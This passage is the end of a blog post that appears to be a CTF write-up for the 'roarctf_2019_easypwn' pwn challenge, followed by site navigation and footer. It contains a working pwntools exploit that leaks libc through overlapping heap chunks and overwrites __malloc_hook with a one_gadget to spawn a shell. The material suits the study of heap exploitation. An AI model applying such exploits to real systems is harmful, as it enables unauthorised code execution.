class="keyword">def</span> <span class="title function_">write</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	ch(<span class="number">4</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):	</span><br><span class="line">	ch(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b calloc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xb0&#x27;</span>)</span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x18</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xb0</span>)+<span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">offset = <span class="number">0x7f99de237b88</span>-<span class="number">0x7f99dde73000</span></span><br><span class="line">libc_base = addr -(<span class="number">0x7f99de237b88</span>-<span class="number">0x7f99dde73000</span>)+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base+<span class="number">0x3c4b10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook : &quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="comment">#onegadget = 0xcafebabedeadbeef</span></span><br><span class="line">onegadget = <span class="number">0x4527a</span>+libc_base</span><br><span class="line">realloc = libc_base+ libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;main_arena : &quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>,<span class="number">0x88</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">17</span>+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">3</span>,<span class="number">0x10</span>,p64(malloc_hook-<span class="number">0x23</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(onegadget)</span><br><span class="line">payload +=p64(realloc)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x60</span>-<span class="built_in">len</span>(payload)) </span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(<span class="number">6</span>,<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

      <div class="tags">
          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-03-22 11:10:55" itemprop="dateModified" datetime="2022-03-22T11:10:55+08:00">2022-03-22</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/03/21/roarctf-2019-easypwn/" title="roarctf_2019_easypwn">http://example.com/2022/03/21/roarctf-2019-easypwn/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/03/20/buuoj-heapcreator/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicis081o9j20zk0m8dmr.jpg" title="buuoj_heapcreator">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> pwn</span>
  <h3>buuoj_heapcreator</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/03/22/tw2017parrot/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipey84bjtj20zk0m8hdt.jpg" title="tw2017parrot">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> pwn</span>
  <h3>tw2017parrot</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E6%AC%A1%E7%9A%84%E9%A2%98%E6%AF%94%E8%BE%83%E9%9A%BE%E6%90%9E%E4%BD%86%E6%98%AF%E6%94%BB%E5%87%BB%E7%82%B9%E6%8C%BA%E5%8D%95%E4%B8%80%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%87%8C%E5%88%B0%E4%BA%862%E4%B8%AA%E6%89%8B%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text"> 这次的题比较难搞，但是攻击点挺单一，过程中里到了 2 个手法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%A5%E5%8F%8A%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> 环境以及保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%BB%E8%A6%81%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 题目主要代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 解题：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 泄露地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink"><span class="toc-number">1.2.2.</span> <span class="toc-text"> unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9E%8E%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 瞎操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text"> exp:</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li class="active"><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="dreamcat"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">dreamcat</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">32</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/03/20/buuoj-heapcreator/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/03/22/tw2017parrot/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/06/slab%E3%80%81slub%E3%80%81slob%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="slab、slub、slob学习记录">slab、slub、slob学习记录</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/kernel/" title="In kernel">kernel</a>
</div>

    <span><a href="/2022/05/03/inctf2021-kqueue/" title="inctf2021_kqueue">inctf2021_kqueue</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/10/pwnable-bookwriter/" title="Untitled">Untitled</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/03/21/roarctf-2019-easypwn/" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/05/10/torghast/" title="torghast">torghast</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/14/heap-paradise/" title="heap_paradise">heap_paradise</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="滴水逆向_学习笔记">滴水逆向_学习笔记</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/25/MRCTF-ezbash/" title="MRCTF_ezbash">MRCTF_ezbash</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/06/19/ciscn-2022-popcalc/" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/05/10/chunzhiIOT/" title="chunzhiIOT">chunzhiIOT</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="Symbols count total">282k words</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="Reading time total">4:16</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/03/21/roarctf-2019-easypwn/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)dreamcat?"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
